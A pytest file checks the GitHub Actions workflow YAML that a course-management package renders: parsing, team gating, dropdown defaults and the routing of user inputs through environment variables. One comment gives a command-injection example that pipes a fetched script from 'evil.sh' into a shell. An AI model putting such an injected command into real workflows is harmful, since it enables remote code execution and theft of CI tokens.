"""The workflow renderers must emit GitHub-parseable YAML with the right inputs/jobs.

A typo in any of these silently breaks a faculty button for every course, so the cheapest
useful guard is: render -> yaml.safe_load -> assert the contract. No network.
"""

from __future__ import annotations

import pytest
import yaml
from conftest import workflow_inputs, workflow_jobs

from dsl_course import (
    discovery,
    profile_readme,
    seed,
    workflows_render,
)

# GitHub's hard cap on workflow_dispatch inputs - both Release materials variants must
# stay under it (they spend 5 of the 10, with nothing render-time-variable left to grow).
GITHUB_MAX_DISPATCH_INPUTS = 10

# The five inputs of a Release materials button, in the order they must appear: exactly a
# schedule.yml `deploy:` entry's fields, plus the cohort org - ordered source-then-target
# (what to copy, then where it lands) and numbered 1-5 in their descriptions to match.
RELEASE_INPUTS = [
    "course_source_repo",
    "course_source_path",
    "cohort_org",
    "cohort_dest_repo",
    "cohort_dest_path",
]

# Every workflow renderer, rendered -> a "it parses, and it's gated" sweep. Completeness
# is enforced by test_every_renderer_is_covered_by_the_yaml_sweep below, so a new button
# cannot ship without passing through yaml.safe_load.
ALL_RENDERED = {
    "release": workflows_render.render_release(
        ["Cohort-f2026"], "course-materials-f2026"
    ),
    "central_release": workflows_render.render_central_release(
        ["course-materials-f2026"], ["Cohort-f2026"]
    ),
    "provision": workflows_render.render_provision(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    ),
    "grade_assignment": workflows_render.render_grade_assignment(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    ),
    "sync_membership": workflows_render.render_sync_membership(["Cohort-f2026"]),
    "send_codes": workflows_render.render_send_codes(["Cohort-f2026"]),
    "sync_gradebooks": workflows_render.render_sync_gradebooks(["Cohort-f2026"]),
    "render_grades": workflows_render.render_render_grades(["Cohort-f2026"]),
    "distribute_grades": workflows_render.render_distribute_grades(["Cohort-f2026"]),
    "bootstrap_cohort": workflows_render.render_bootstrap_cohort(),
    "refresh": workflows_render.render_refresh(),
    "new_materials": workflows_render.render_new_materials(),
    "new_assignment": workflows_render.render_new_assignment(),
    "sync_site": workflows_render.render_sync_site(["Cohort-f2026"]),
    "publish_site": workflows_render.render_publish_site(["course-materials-f2026"]),
    "status": workflows_render.render_status(["Cohort-f2026"]),
    "scheduler": workflows_render.render_scheduler(),
}

# The renderers with no check-team gate: cron runs have no actor to check, and both jobs
# only re-call idempotent functions (the scheduler's releases, refresh's re-seeding).
UNGATED = {"scheduler", "refresh"}

# Every renderer that takes a discovered list of orgs/repos, rendered with TWO cohorts
# (and two of everything else) so dropdown ORDER is observable - ALL_RENDERED passes
# single-element lists, which cannot tell "newest first" from "oldest first".
COHORTS_2 = ["Cohort-f2025", "Cohort-f2026"]
REPOS_2 = ["course-materials-f2025", "course-materials-f2026"]
ASSIGNMENTS_2 = ["assignment-1-f2025", "assignment-1-f2026"]
DATED_RENDERED = {
    "release": workflows_render.render_release(COHORTS_2, "course-materials-f2026"),
    "central_release": workflows_render.render_central_release(REPOS_2, COHORTS_2),
    "provision": workflows_render.render_provision(COHORTS_2, ASSIGNMENTS_2),
    "grade_assignment": workflows_render.render_grade_assignment(
        COHORTS_2, ASSIGNMENTS_2
    ),
    "sync_membership": workflows_render.render_sync_membership(COHORTS_2),
    "send_codes": workflows_render.render_send_codes(COHORTS_2),
    "sync_gradebooks": workflows_render.render_sync_gradebooks(COHORTS_2),
    "render_grades": workflows_render.render_render_grades(COHORTS_2),
    "distribute_grades": workflows_render.render_distribute_grades(COHORTS_2),
    "sync_site": workflows_render.render_sync_site(COHORTS_2),
    "publish_site": workflows_render.render_publish_site(REPOS_2),
    "status": workflows_render.render_status(COHORTS_2),
}


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_renders_valid_yaml(name):
    doc = yaml.safe_load(ALL_RENDERED[name])
    assert isinstance(doc, dict) and doc.get("name")
    # Every faculty workflow is a workflow_dispatch with a check-team gate.
    assert ("check-team" in workflow_jobs(ALL_RENDERED[name])) is (name not in UNGATED)


@pytest.mark.parametrize("name", sorted(DATED_RENDERED))
def test_every_org_repo_dropdown_pre_selects_the_newest(name):
    # Dropdowns are listed alphabetically, which puts the OLDEST cohort/materials repo
    # first - and GitHub selects the first option. Every one of them must therefore carry
    # an explicit `default:` naming the current year's, or faculty release last year's
    # materials to last year's cohort with one wrong click.
    for field, spec in workflow_inputs(DATED_RENDERED[name]).items():
        options = spec.get("options", [])
        if not any("2026" in o for o in options):
            continue  # a fixed vocabulary (reading-list / individual / group / ...)
        default = spec.get("default")
        # Sync enrolment's cohort_org is the one exception: it stays pinned to the
        # faculty-only sentinel, because touching a cohort must be opted into.
        if default == workflows_render._FACULTY_ONLY:
            continue
        assert default in options, f"{name}.{field} default must be one of its options"
        assert "2026" in default, f"{name}.{field} pre-selects {default}, not f2026"


def test_every_renderer_is_covered_by_the_yaml_sweep():
    # A renderer that never gets yaml.safe_load'ed can ship a typo that breaks a faculty
    # button in every course org, so the sweep above must cover ALL of them by name.
    renderers = {
        n.removeprefix("render_")
        for n in vars(workflows_render)
        if n.startswith("render_")
    }
    assert renderers == set(ALL_RENDERED)


def test_publish_site_inputs():
    inp = workflow_inputs(
        workflows_render.render_publish_site(
            ["course-materials-f2026", "course-materials-f2025"]
        )
    )
    assert set(inp) == {"source_repo", "readings_mode", "include_lectures"}
    assert inp["source_repo"]["options"] == [
        "course-materials-f2026",
        "course-materials-f2025",
    ]
    assert inp["readings_mode"]["options"] == [
        "reading-list",
        "actual-readings",
        "none",
    ]
    assert inp["readings_mode"]["default"] == "reading-list"
    assert inp["include_lectures"]["type"] == "boolean"


def test_publish_site_has_publish_job_running_public_sync():
    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
    assert "publish" in workflow_jobs(rendered)
    assert "dsl_course.site public-sync" in rendered
    # include_lectures off must map to the CLI flag.
    assert "--no-include-lectures" in rendered


def test_publish_site_cron_resyncs_from_persisted_settings():
    # The only flow that used to need a human re-click: a daily cron now re-runs the last
    # publish's persisted settings (public-sync with no source args), while the manual
    # button keeps its inputs and its check-team gate exactly as before.
    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
    doc = yaml.safe_load(rendered)
    trigger = doc.get("on", doc.get(True))
    assert trigger["schedule"] == [{"cron": "30 5 * * *"}]
    assert "workflow_dispatch" in trigger
    jobs = workflow_jobs(rendered)
    resync = jobs["resync"]
    assert resync["if"] == "github.event_name == 'schedule'"
    assert "needs" not in resync  # cron has no actor, so it skips the check-team gate
    run = resync["steps"][-1]["run"]
    assert "python3 -m dsl_course.site public-sync --course-org" in run
    assert "--source-repo" not in run  # no inputs: the settings come from the site repo
    assert jobs["publish"]["needs"] == "check-team"


def test_refresh_re_seeds_itself_nightly_without_a_gate():
    # Seeded workflows are frozen at seed time while the engine they call runs from central
    # main, so an org left alone drifts. The daily cron is what converges it - and it must
    # run ungated, because a scheduled run has no actor for check-team to check.
    rendered = workflows_render.render_refresh()
    doc = yaml.safe_load(rendered)
    trigger = doc.get("on", doc.get(True))
    assert trigger["schedule"] == [{"cron": "27 5 * * *"}]
    assert "workflow_dispatch" in trigger
    assert "check-team" not in rendered
    assert "needs" not in workflow_jobs(rendered)["refresh"]


def test_provision_type_choice_defaults_to_auto():
    # Manual dispatch surfaces the individual/group choice, but `auto` (follow
    # schedule.yml / the template's grading.yml) is the default - dispatching without
    # thinking about it must match what the schedule would have done.
    rendered = workflows_render.render_provision(
        ["Cohort-f2026"], ["assignment-4-project-f2026"]
    )
    inp = workflow_inputs(rendered)
    assert inp["type"]["options"] == ["auto", "individual", "group"]
    assert inp["type"]["default"] == "auto"
    step = workflow_jobs(rendered)["provision"]["steps"][-1]
    assert step["env"]["TYPE"] == "${{ inputs.type }}"
    assert '--type "$TYPE"' in rendered


def test_grade_assignment_calls_collect_with_no_deadline_input():
    # SSOT: the grading deadline comes from the cohort schedule, so the button has no
    # deadline input and never passes --deadline (collect derives it).
    rendered = workflows_render.render_grade_assignment(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    )
    inp = workflow_inputs(rendered)
    assert "deadline" not in inp and inp["group"]["type"] == "boolean"
    assert "dsl_course.collect" in rendered
    assert "--group" in rendered and "--deadline" not in rendered


def test_sync_membership_is_a_consolidated_reconcile():
    # One consolidated, fully-automatic reconcile (roster + teams + faculty) - no
    # --prune toggle at this level, config is always the live truth.
    rendered = workflows_render.render_sync_membership(["Cohort-f2026"])
    inp = workflow_inputs(rendered)
    assert set(inp) == {"cohort_org"}
    assert inp["cohort_org"]["default"] == workflows_render._FACULTY_ONLY
    assert inp["cohort_org"]["options"] == [
        workflows_render._FACULTY_ONLY,
        "Cohort-f2026",
    ]
    assert "dsl_course.sync_membership" in rendered
    assert "--prune" not in rendered
    jobs = workflow_jobs(rendered)
    assert {"check-team", "sync-dispatch", "sync-auto"} <= set(jobs)
    trigger = yaml.safe_load(rendered).get("on", yaml.safe_load(rendered).get(True))
    assert set(trigger) == {
        "push",
        "repository_dispatch",
        "schedule",
        "workflow_dispatch",
    }


def test_dotgithub_readme_orients_faculty():
    # The .github repo's own README points faculty at the Actions tab where the buttons live.
    course = profile_readme.render_dotgithub_readme(
        "My-Course-E1", "My Course", is_cohort=False
    )
    assert "control panel" in course
    assert "My-Course-E1/.github/actions" in course
    # A cohort org sends faculty to the parent course org for the buttons instead.
    cohort = profile_readme.render_dotgithub_readme(
        "My-Course-f2026", "My Course", is_cohort=True
    )
    assert "parent course org" in cohort


@pytest.mark.parametrize(
    "rendered",
    [
        workflows_render.render_release(
            ["Cohort-f2025", "Cohort-f2026"], "course-materials-f2026"
        ),
        workflows_render.render_central_release(
            ["course-materials-f2026"], ["Cohort-f2025", "Cohort-f2026"]
        ),
    ],
    ids=["run-from-repo", "central"],
)
def test_both_release_buttons_take_exactly_a_deploy_entrys_fields(rendered):
    # The whole point of the merged button: its inputs ARE a schedule.yml `deploy:`
    # entry (plus the cohort org), same names, same order, on BOTH variants - so what
    # faculty learn on the button reads straight across into the schedule.
    inp = workflow_inputs(rendered)
    assert list(inp) == RELEASE_INPUTS
    assert len(inp) <= GITHUB_MAX_DISPATCH_INPUTS
    assert inp["cohort_org"]["required"] is True
    assert inp["course_source_repo"]["required"] is True
    assert inp["course_source_path"]["required"] is True
    # Naming the destination repo is forced rather than defaulted - a release that lands
    # in an unnoticed second materials repo is invisible to the cohort. (The schedule's
    # `deploy:` may still omit it; deploy.main's `materials` fallback covers that path.)
    assert inp["cohort_dest_repo"]["required"] is True
    assert "default" not in inp["cohort_dest_repo"]
    # cohort_dest_path is the one optional box, and ships EMPTY - a `default:` on a
    # free-text field is submitted verbatim, so pre-filling puts words in the faculty
    # member's mouth. Its fallback is stated on the box instead, or it is invisible.
    assert inp["cohort_dest_path"]["required"] is False
    assert "default" not in inp["cohort_dest_path"]
    assert "blank = mirrors" in inp["cohort_dest_path"]["description"]
    # Multi-path is discoverable from the button itself, not just the docs.
    assert "comma-separated" in inp["course_source_path"]["description"]
    # Every box is numbered in the order it is filled in - GitHub renders dispatch inputs
    # as a flat list with no grouping, so the sequence has to be in the labels.
    for n, name in enumerate(RELEASE_INPUTS, start=1):
        assert inp[name]["description"].startswith(f"{n}. ")
    # The cohort dropdown pre-selects the latest cohort, not the alphabetically first.
    assert inp["cohort_org"]["default"] == "Cohort-f2026"
    # Gone with the section machinery: no per-section checkboxes, no session list, no
    # root-files toggle, no cohort_repo dropdown.
    for retired in (
        "sessions",
        "include_root_files",
        "cohort_repo",
        "release_lectures",
    ):
        assert retired not in inp


@pytest.mark.parametrize(
    "rendered",
    [
        workflows_render.render_release(["Cohort-f2026"], "course-materials-f2026"),
        workflows_render.render_central_release(
            ["course-materials-f2026"], ["Cohort-f2026"]
        ),
    ],
    ids=["run-from-repo", "central"],
)
def test_both_release_buttons_run_the_same_executor_through_env(rendered):
    # One executor for the schedule and the button (deploy.deploy_many, reached
    # via its CLI), and every user-supplied input reaches the shell as an env var.
    step = workflow_jobs(rendered)["release"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["COURSE_SOURCE_REPO"] == "${{ inputs.course_source_repo }}"
    assert step["env"]["COURSE_SOURCE_PATH"] == "${{ inputs.course_source_path }}"
    assert step["env"]["COHORT_DEST_REPO"] == "${{ inputs.cohort_dest_repo }}"
    assert step["env"]["COHORT_DEST_PATH"] == "${{ inputs.cohort_dest_path }}"
    assert "python3 -m dsl_course.deploy" in step["run"]
    for flag in ("--course-source-path", "--cohort-dest-repo", "--cohort-dest-path"):
        assert flag in step["run"]


def test_run_from_repo_button_prefills_course_source_repo_with_its_own_repo():
    # Inside a content repo the source is almost always that repo, so it is pre-filled -
    # but as free text, not a fixed expression, so another repo in the org can be typed in.
    inp = workflow_inputs(
        workflows_render.render_release(["Cohort-f2026"], "course-materials-f2026")
    )
    assert inp["course_source_repo"]["default"] == "course-materials-f2026"
    assert "type" not in inp["course_source_repo"]  # a string field, not a choice


def test_central_button_offers_the_orgs_content_repos_as_the_source_dropdown():
    # Centrally there is no "own" repo to pre-fill, so course_source_repo is the discovered
    # dropdown (refreshed by Refresh actions), listed alphabetically but pre-selected on
    # the latest term year - the repo faculty are teaching from now.
    inp = workflow_inputs(
        workflows_render.render_central_release(
            ["course-materials-f2025", "course-materials-f2026", "lecture-code"],
            ["Cohort-f2026"],
        )
    )
    assert inp["course_source_repo"]["type"] == "choice"
    assert inp["course_source_repo"]["options"] == [
        "course-materials-f2025",
        "course-materials-f2026",
        "lecture-code",
    ]
    assert inp["course_source_repo"]["default"] == "course-materials-f2026"


def test_undated_dropdown_options_leave_the_default_to_github():
    # A course org whose repos carry no term year has no "latest" to pre-select; emitting
    # a `default:` that is not one of the options would break the workflow outright, so
    # the dropdown ships bare and GitHub selects the first option.
    inp = workflow_inputs(
        workflows_render.render_central_release(
            ["lecture-code", "slides"], ["Cohort-A"]
        )
    )
    assert "default" not in inp["course_source_repo"]
    assert "default" not in inp["cohort_org"]
    # An org code that merely ends in four digits is not a year (GRAD-E1234 != 1234 AD).
    inp = workflow_inputs(
        workflows_render.render_central_release(["mat-e1234"], ["Cohort-e1234"])
    )
    assert "default" not in inp["cohort_org"]


def test_content_repos_get_both_buttons_and_lose_the_retired_one(monkeypatch):
    # Refresh actions re-renders every run-from-repo workflow (so a fix reaches live
    # courses) - and removes release-code.yml, whose CLI no longer exists now that
    # Release materials takes any path.
    pushed, deleted = {}, []
    monkeypatch.setattr(
        seed,
        "put_file",
        lambda org, repo, path, content, msg: pushed.setdefault(path, content.decode()),
    )
    monkeypatch.setattr(
        seed, "delete_file", lambda org, repo, path, msg: deleted.append(path)
    )
    seed._push_workflows(
        "Course", "course-materials-f2026", ["Cohort-f2026"], ["assignment-1-f2026"]
    )
    assert (
        set(pushed)
        == set(seed.WORKFLOWS)
        == {
            ".github/workflows/release-materials.yml",
            ".github/workflows/release-assignment.yml",
        }
    )
    assert deleted == [".github/workflows/release-code.yml"]
    # The materials button seeded into a content repo is that repo's own variant.
    materials = yaml.safe_load(pushed[".github/workflows/release-materials.yml"])
    trigger = materials.get("on", materials.get(True))
    inputs = trigger["workflow_dispatch"]["inputs"]
    assert list(inputs) == RELEASE_INPUTS
    assert inputs["course_source_repo"]["default"] == "course-materials-f2026"


def test_seed_exports_exactly_what_its_callers_reach_for():
    # seed.__all__ IS the contract now: the names other modules use as `seed.<name>`
    # (site, scaffold, bootstrap_course, sync_faculty, sync_membership). Pinned here, so
    # trimming one that a caller still uses fails loudly instead of at runtime.
    assert set(seed.__all__) == {
        "seed_github_workflows",
        "_push_workflows",
        "COHORTS_PATH",
        "discover_assignments",
        "discover_cohort_repos",
        "discover_cohorts",
        "discover_content_repos",
        "discover_release_sources",
        "discover_sessions",
        "register_cohort",
        "update_profile_readme",
    }
    for name in seed.__all__:
        assert getattr(seed, name, None) is not None, f"seed.{name} does not resolve"
    # ...and they are the real thing, not a stale copy.
    assert seed.discover_release_sources is discovery.discover_release_sources
    assert seed.update_profile_readme is profile_readme.update_profile_readme


def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
    # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
    # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
    # user-supplied input must reach the script as an env var instead.
    materials, assignment = (
        workflows_render.render_new_materials(),
        workflows_render.render_new_assignment(),
    )
    for rendered in (materials, assignment):
        step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
        assert "${{" not in step["run"]
        assert step["env"]["TAG"] == "${{ inputs.tag }}"
    assert '--tag "$TAG"' in materials
    assert '--number "$NUMBER"' in assignment


def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
    from pathlib import Path

    wf = (
        Path(__file__).resolve().parents[1]
        / ".github"
        / "workflows"
        / "bootstrap-org.yml"
    ).read_text()
    step = yaml.safe_load(wf)["jobs"]["bootstrap"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["ORG"] == "${{ inputs.org }}"
    assert step["env"]["ORG_NAME"] == "${{ inputs.org_name }}"
    assert step["env"]["COURSE_CODE"] == "${{ inputs.course_code }}"


def test_choice_falls_back_when_empty():
    # An empty dropdown must still be valid YAML (a placeholder option), never blank.
    assert "(none-yet)" in workflows_render._choice([])
    inp = workflow_inputs(workflows_render.render_publish_site([]))
    assert inp["source_repo"]["options"] == ["(none-yet)"]


def test_sync_site_auto_resyncs_on_sourced_changes():
    # Sync site must auto-fire (no manual click) on the things the site reads: a push to
    # the course dsl-course.yml, a repository_dispatch from a cohort's schedule.yml, and a
    # daily cron catch-all. The auto path is ungated (no check-team); manual stays gated.
    doc = yaml.safe_load(workflows_render.render_sync_site(["Cohort-f2026"]))
    trigger = doc.get("on", doc.get(True))
    assert "dsl-course.yml" in trigger["push"]["paths"]
    assert trigger["repository_dispatch"]["types"] == ["sync-site"]
    assert trigger["schedule"][0]["cron"] == "0 6 * * *"
    assert "workflow_dispatch" in trigger
    jobs = doc["jobs"]
    # the ungated auto job runs for non-manual events; the gated one needs check-team
    assert jobs["sync-auto"]["if"] == "github.event_name != 'workflow_dispatch'"
    assert "check-team" not in jobs["sync-auto"].get("needs", "")
    assert jobs["sync"]["needs"] == "check-team"


def test_classroom_config_site_dispatcher_fires_on_schedule_or_people_change():
    # Both files feed the site: schedule.yml its dates, people.yml its staff cards. A
    # people.yml edit must not have to wait for the daily cron. (people.yml also fires
    # dispatch-sync.yml - a different workflow, event type sync-membership - which is fine.)
    from pathlib import Path

    tmpl = (
        Path(__file__).resolve().parents[1]
        / "templates"
        / "classroom-config"
        / "dispatch-sync-site.yml"
    ).read_text()
    doc = yaml.safe_load(tmpl)
    trigger = doc.get("on", doc.get(True))
    assert sorted(trigger["push"]["paths"]) == ["people.yml", "schedule.yml"]
    assert "sync-site" in tmpl  # dispatches the sync-site event


def test_new_assignment_button_exposes_format_and_type():
    # The grading.yml vocabulary (format: py/notebook, type: individual/group) is chosen
    # on the button and recorded by the scaffold - not hand-edited in afterwards.
    rendered = workflows_render.render_new_assignment()
    inputs = workflow_inputs(rendered)
    assert inputs["format"]["options"] == ["py", "notebook"]
    assert inputs["format"]["default"] == "py"
    assert inputs["type"]["options"] == ["individual", "group"]
    assert inputs["type"]["default"] == "individual"
    step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["FORMAT"] == "${{ inputs.format }}"
    assert step["env"]["TYPE"] == "${{ inputs.type }}"
    assert '--format "$FORMAT"' in rendered and '--type "$TYPE"' in rendered


def test_validate_schedule_workflow_is_seeded_with_the_central_repo_pinned():
    # Seeded into a cohort's classroom-config, so it must carry the central repo and ref
    # baked in - the cohort repo has no other way to reach the parser.
    from dsl_course.bootstrap_course import _validate_schedule_workflow
    from dsl_course.central import CENTRAL, CENTRAL_REF

    raw = _validate_schedule_workflow()
    assert "__CENTRAL__" not in raw and "__CENTRAL_REF__" not in raw
    doc = yaml.safe_load(raw)
    trigger = doc.get("on", doc.get(True))

    # fires where the file is edited, and on demand
    assert trigger["push"]["paths"] == ["schedule.yml"]
    assert trigger["push"]["branches"] == ["main"]
    assert "workflow_dispatch" in trigger

    steps = doc["jobs"]["validate"]["steps"]
    central = next(s for s in steps if s.get("with", {}).get("repository"))
    assert central["with"]["repository"] == CENTRAL
    assert central["with"]["ref"] == CENTRAL_REF

    # validates the cohort's OWN file, not a fetched copy - no token needed to read it
    run = next(s for s in steps if s.get("id") == "validate")["run"]
    assert "--file ../cohort/schedule.yml --validate" in run
    assert "$GITHUB_STEP_SUMMARY" in run

    # the run must end red so the commit is marked, and needs issues:write to escalate
    assert doc["permissions"]["issues"] == "write"
    assert any("exit 1" in s.get("run", "") for s in steps)


# -------------------------------------- update_profile_readme guards its config load
# A malformed dsl-course.yml used to raise a bare yaml traceback from mid-refresh (after
# workflows were pushed, before the welcome/sample refresh), half-converging the nightly
# run. It now loads through utils.load_yaml_config: absent -> fall back to the org name;
# malformed/non-mapping -> raise with a clear, logged message.


def test_update_profile_readme_absent_config_falls_back_without_crashing(monkeypatch):
    from dsl_course import profile_readme as P

    monkeypatch.setattr("dsl_course.utils.get_file_content", lambda *a, **k: None)
    monkeypatch.setattr(
        P,
        "list_org_repos",
        lambda org: [
            {"name": "welcome", "url": "u", "visibility": "private", "description": ""}
        ],
    )
    monkeypatch.setattr(P, "discover_cohorts", lambda org: [])
    writes = []
    monkeypatch.setattr(P, "put_file", lambda *a, **k: writes.append(a) or True)
    monkeypatch.setattr(P, "log_ok", lambda *a, **k: None)

    P.update_profile_readme("Cohort-f2026")  # must not raise
    assert len(writes) == 2  # both READMEs written, using the org name as the fallback


def test_update_profile_readme_raises_clearly_on_a_malformed_config(
    monkeypatch, capsys
):
    from dsl_course import profile_readme as P

    monkeypatch.setattr(
        "dsl_course.utils.get_file_content",
        lambda *a, **k: "course_name: [unclosed\n",
    )
    with pytest.raises(yaml.YAMLError):
        P.update_profile_readme("Course-Org")
    assert "malformed YAML" in capsys.readouterr().err
